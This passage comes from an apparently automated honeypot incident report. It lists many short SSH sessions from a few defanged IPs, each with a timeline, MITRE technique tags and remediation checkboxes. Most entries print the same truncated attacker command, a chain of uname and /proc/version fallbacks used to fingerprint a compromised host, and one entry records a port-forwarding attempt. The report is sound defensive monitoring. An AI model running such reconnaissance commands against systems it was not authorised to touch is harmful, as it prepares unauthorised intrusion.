| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:26:13` | `cowrie.session.connect` |
| `2026-07-24 18:26:13` | `cowrie.client.version` |
| `2026-07-24 18:26:13` | `cowrie.client.kex` |
| `2026-07-24 18:26:14` | `cowrie.login.success` |
| `2026-07-24 18:26:16` | `cowrie.session.params` |
| `2026-07-24 18:26:16` | `cowrie.command.input` |
| `2026-07-24 18:26:16` | `cowrie.command.input` |
| `2026-07-24 18:26:16` | `cowrie.command.input` |
| `2026-07-24 18:26:16` | `cowrie.command.input` |
| `2026-07-24 18:26:16` | `cowrie.command.input` |
| `2026-07-24 18:26:16` | `cowrie.command.success` |
| `2026-07-24 18:26:16` | `cowrie.command.input` |
| `2026-07-24 18:26:16` | `cowrie.command.input` |
| `2026-07-24 18:26:16` | `cowrie.command.input` |
| `2026-07-24 18:26:16` | `cowrie.command.input` |
| `2026-07-24 18:26:16` | `cowrie.log.closed` |
| `2026-07-24 18:26:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-033764a568fe

| Field | Detail |
|---|---|
| **Source IP** | `65.20.202[.]4` |
| **First Seen** | 2026-07-24 18:26 |
| **Last Seen** | 2026-07-24 18:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:26:27` | `cowrie.session.connect` |
| `2026-07-24 18:26:27` | `cowrie.client.version` |
| `2026-07-24 18:26:27` | `cowrie.client.kex` |
| `2026-07-24 18:26:28` | `cowrie.login.success` |
| `2026-07-24 18:26:29` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:26:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.202[.]4` to AbuseIPDB if not already reported
- [ ] Block `65.20.202[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-370d74875ba8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:26 |
| **Last Seen** | 2026-07-24 18:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:26:57` | `cowrie.session.connect` |
| `2026-07-24 18:26:57` | `cowrie.client.version` |
| `2026-07-24 18:26:57` | `cowrie.client.kex` |
| `2026-07-24 18:26:58` | `cowrie.login.success` |
| `2026-07-24 18:27:00` | `cowrie.session.params` |
| `2026-07-24 18:27:00` | `cowrie.command.input` |
| `2026-07-24 18:27:00` | `cowrie.command.input` |
| `2026-07-24 18:27:00` | `cowrie.command.input` |
| `2026-07-24 18:27:00` | `cowrie.command.input` |
| `2026-07-24 18:27:00` | `cowrie.command.input` |
| `2026-07-24 18:27:00` | `cowrie.command.success` |
| `2026-07-24 18:27:00` | `cowrie.command.input` |
| `2026-07-24 18:27:00` | `cowrie.command.input` |
| `2026-07-24 18:27:00` | `cowrie.command.input` |
| `2026-07-24 18:27:00` | `cowrie.command.input` |
| `2026-07-24 18:27:00` | `cowrie.log.closed` |
| `2026-07-24 18:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15082d2bed6f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:27 |
| **Last Seen** | 2026-07-24 18:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:27:29` | `cowrie.session.connect` |
| `2026-07-24 18:27:29` | `cowrie.client.version` |
| `2026-07-24 18:27:29` | `cowrie.client.kex` |
| `2026-07-24 18:27:31` | `cowrie.login.success` |
| `2026-07-24 18:27:32` | `cowrie.session.params` |
| `2026-07-24 18:27:32` | `cowrie.command.input` |
| `2026-07-24 18:27:32` | `cowrie.command.input` |
| `2026-07-24 18:27:32` | `cowrie.command.input` |
| `2026-07-24 18:27:32` | `cowrie.command.input` |
| `2026-07-24 18:27:32` | `cowrie.command.input` |
| `2026-07-24 18:27:32` | `cowrie.command.success` |
| `2026-07-24 18:27:32` | `cowrie.command.input` |
| `2026-07-24 18:27:32` | `cowrie.command.input` |
| `2026-07-24 18:27:32` | `cowrie.command.input` |
| `2026-07-24 18:27:32` | `cowrie.command.input` |
| `2026-07-24 18:27:32` | `cowrie.log.closed` |
| `2026-07-24 18:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f782037c28

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:28 |
| **Last Seen** | 2026-07-24 18:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:28:39` | `cowrie.session.connect` |
| `2026-07-24 18:28:40` | `cowrie.client.version` |
| `2026-07-24 18:28:40` | `cowrie.client.kex` |
| `2026-07-24 18:28:41` | `cowrie.login.success` |
| `2026-07-24 18:28:42` | `cowrie.session.params` |
| `2026-07-24 18:28:42` | `cowrie.command.input` |
| `2026-07-24 18:28:42` | `cowrie.command.input` |
| `2026-07-24 18:28:42` | `cowrie.command.input` |
| `2026-07-24 18:28:42` | `cowrie.command.input` |
| `2026-07-24 18:28:42` | `cowrie.command.input` |
| `2026-07-24 18:28:42` | `cowrie.command.success` |
| `2026-07-24 18:28:42` | `cowrie.command.input` |
| `2026-07-24 18:28:42` | `cowrie.command.input` |
| `2026-07-24 18:28:42` | `cowrie.command.input` |
| `2026-07-24 18:28:42` | `cowrie.command.input` |
| `2026-07-24 18:28:43` | `cowrie.log.closed` |
| `2026-07-24 18:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d3bbe803301

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:28 |
| **Last Seen** | 2026-07-24 18:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:28:46` | `cowrie.session.connect` |
| `2026-07-24 18:28:46` | `cowrie.client.version` |
| `2026-07-24 18:28:46` | `cowrie.client.kex` |
| `2026-07-24 18:28:48` | `cowrie.login.success` |
| `2026-07-24 18:28:49` | `cowrie.session.params` |
| `2026-07-24 18:28:49` | `cowrie.command.input` |
| `2026-07-24 18:28:49` | `cowrie.command.input` |
| `2026-07-24 18:28:49` | `cowrie.command.input` |
| `2026-07-24 18:28:49` | `cowrie.command.input` |
| `2026-07-24 18:28:49` | `cowrie.command.input` |
| `2026-07-24 18:28:49` | `cowrie.command.success` |
| `2026-07-24 18:28:49` | `cowrie.command.input` |
| `2026-07-24 18:28:49` | `cowrie.command.input` |
| `2026-07-24 18:28:49` | `cowrie.command.input` |
| `2026-07-24 18:28:49` | `cowrie.command.input` |
| `2026-07-24 18:28:49` | `cowrie.log.closed` |
| `2026-07-24 18:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2185bb5eb25d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:30 |
| **Last Seen** | 2026-07-24 18:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:30:06` | `cowrie.session.connect` |
| `2026-07-24 18:30:06` | `cowrie.client.version` |
| `2026-07-24 18:30:06` | `cowrie.client.kex` |
| `2026-07-24 18:30:07` | `cowrie.login.success` |
| `2026-07-24 18:30:09` | `cowrie.session.params` |
| `2026-07-24 18:30:09` | `cowrie.command.input` |
| `2026-07-24 18:30:09` | `cowrie.command.input` |
| `2026-07-24 18:30:09` | `cowrie.command.input` |
| `2026-07-24 18:30:09` | `cowrie.command.input` |
| `2026-07-24 18:30:09` | `cowrie.command.input` |
| `2026-07-24 18:30:09` | `cowrie.command.success` |
| `2026-07-24 18:30:09` | `cowrie.command.input` |
| `2026-07-24 18:30:09` | `cowrie.command.input` |
| `2026-07-24 18:30:09` | `cowrie.command.input` |
| `2026-07-24 18:30:09` | `cowrie.command.input` |
| `2026-07-24 18:30:09` | `cowrie.log.closed` |
| `2026-07-24 18:30:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-821311a4d747

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:30 |
| **Last Seen** | 2026-07-24 18:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:30:24` | `cowrie.session.connect` |
| `2026-07-24 18:30:24` | `cowrie.client.version` |
| `2026-07-24 18:30:24` | `cowrie.client.kex` |
| `2026-07-24 18:30:24` | `cowrie.login.success` |
| `2026-07-24 18:30:27` | `cowrie.session.params` |
| `2026-07-24 18:30:27` | `cowrie.command.input` |
| `2026-07-24 18:30:27` | `cowrie.command.input` |
| `2026-07-24 18:30:27` | `cowrie.command.input` |
| `2026-07-24 18:30:27` | `cowrie.command.input` |
| `2026-07-24 18:30:27` | `cowrie.command.input` |
| `2026-07-24 18:30:27` | `cowrie.command.success` |
| `2026-07-24 18:30:27` | `cowrie.command.input` |
| `2026-07-24 18:30:27` | `cowrie.command.input` |
| `2026-07-24 18:30:27` | `cowrie.command.input` |
| `2026-07-24 18:30:27` | `cowrie.command.input` |
| `2026-07-24 18:30:27` | `cowrie.log.closed` |
| `2026-07-24 18:30:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-880174b02c8c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:31 |
| **Last Seen** | 2026-07-24 18:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:31:26` | `cowrie.session.connect` |
| `2026-07-24 18:31:27` | `cowrie.client.version` |
| `2026-07-24 18:31:27` | `cowrie.client.kex` |
| `2026-07-24 18:31:28` | `cowrie.login.success` |
| `2026-07-24 18:31:29` | `cowrie.session.params` |
| `2026-07-24 18:31:29` | `cowrie.command.input` |
| `2026-07-24 18:31:29` | `cowrie.command.input` |
| `2026-07-24 18:31:29` | `cowrie.command.input` |
| `2026-07-24 18:31:29` | `cowrie.command.input` |
| `2026-07-24 18:31:29` | `cowrie.command.input` |
| `2026-07-24 18:31:29` | `cowrie.command.success` |
| `2026-07-24 18:31:29` | `cowrie.command.input` |
| `2026-07-24 18:31:29` | `cowrie.command.input` |
| `2026-07-24 18:31:29` | `cowrie.command.input` |
| `2026-07-24 18:31:29` | `cowrie.command.input` |
| `2026-07-24 18:31:29` | `cowrie.log.closed` |
| `2026-07-24 18:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29bc0a25ebef

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:32 |
| **Last Seen** | 2026-07-24 18:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:32:10` | `cowrie.session.connect` |
| `2026-07-24 18:32:10` | `cowrie.client.version` |
| `2026-07-24 18:32:10` | `cowrie.client.kex` |
| `2026-07-24 18:32:11` | `cowrie.login.success` |
| `2026-07-24 18:32:13` | `cowrie.session.params` |
| `2026-07-24 18:32:13` | `cowrie.command.input` |
| `2026-07-24 18:32:13` | `cowrie.command.input` |
| `2026-07-24 18:32:13` | `cowrie.command.input` |
| `2026-07-24 18:32:13` | `cowrie.command.input` |
| `2026-07-24 18:32:13` | `cowrie.command.input` |
| `2026-07-24 18:32:13` | `cowrie.command.success` |
| `2026-07-24 18:32:13` | `cowrie.command.input` |
| `2026-07-24 18:32:13` | `cowrie.command.input` |
| `2026-07-24 18:32:13` | `cowrie.command.input` |
| `2026-07-24 18:32:13` | `cowrie.command.input` |
| `2026-07-24 18:32:13` | `cowrie.log.closed` |
| `2026-07-24 18:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d99627b170ca

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:32 |
| **Last Seen** | 2026-07-24 18:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:32:50` | `cowrie.session.connect` |
| `2026-07-24 18:32:50` | `cowrie.client.version` |
| `2026-07-24 18:32:50` | `cowrie.client.kex` |
| `2026-07-24 18:32:51` | `cowrie.login.success` |
| `2026-07-24 18:32:52` | `cowrie.session.params` |
| `2026-07-24 18:32:52` | `cowrie.command.input` |
| `2026-07-24 18:32:52` | `cowrie.command.input` |
| `2026-07-24 18:32:52` | `cowrie.command.input` |
| `2026-07-24 18:32:52` | `cowrie.command.input` |
| `2026-07-24 18:32:52` | `cowrie.command.input` |
| `2026-07-24 18:32:52` | `cowrie.command.success` |
| `2026-07-24 18:32:52` | `cowrie.command.input` |
| `2026-07-24 18:32:52` | `cowrie.command.input` |
| `2026-07-24 18:32:52` | `cowrie.command.input` |
| `2026-07-24 18:32:52` | `cowrie.command.input` |
| `2026-07-24 18:32:52` | `cowrie.log.closed` |
| `2026-07-24 18:32:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-196e0fc2e00c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:33 |
| **Last Seen** | 2026-07-24 18:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:33:56` | `cowrie.session.connect` |
| `2026-07-24 18:33:57` | `cowrie.client.version` |
| `2026-07-24 18:33:57` | `cowrie.client.kex` |
| `2026-07-24 18:33:58` | `cowrie.login.success` |
| `2026-07-24 18:33:59` | `cowrie.session.params` |
| `2026-07-24 18:33:59` | `cowrie.command.input` |
| `2026-07-24 18:33:59` | `cowrie.command.input` |
| `2026-07-24 18:33:59` | `cowrie.command.input` |
| `2026-07-24 18:33:59` | `cowrie.command.input` |
| `2026-07-24 18:33:59` | `cowrie.command.input` |
| `2026-07-24 18:33:59` | `cowrie.command.success` |
| `2026-07-24 18:33:59` | `cowrie.command.input` |
| `2026-07-24 18:33:59` | `cowrie.command.input` |
| `2026-07-24 18:33:59` | `cowrie.command.input` |
| `2026-07-24 18:33:59` | `cowrie.command.input` |
| `2026-07-24 18:33:59` | `cowrie.log.closed` |
| `2026-07-24 18:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-530255cf8708

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:34 |
| **Last Seen** | 2026-07-24 18:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:34:15` | `cowrie.session.connect` |
| `2026-07-24 18:34:15` | `cowrie.client.version` |
| `2026-07-24 18:34:15` | `cowrie.client.kex` |
| `2026-07-24 18:34:16` | `cowrie.login.success` |
| `2026-07-24 18:34:17` | `cowrie.session.params` |
| `2026-07-24 18:34:17` | `cowrie.command.input` |
| `2026-07-24 18:34:17` | `cowrie.command.input` |
| `2026-07-24 18:34:17` | `cowrie.command.input` |
| `2026-07-24 18:34:17` | `cowrie.command.input` |
| `2026-07-24 18:34:17` | `cowrie.command.input` |
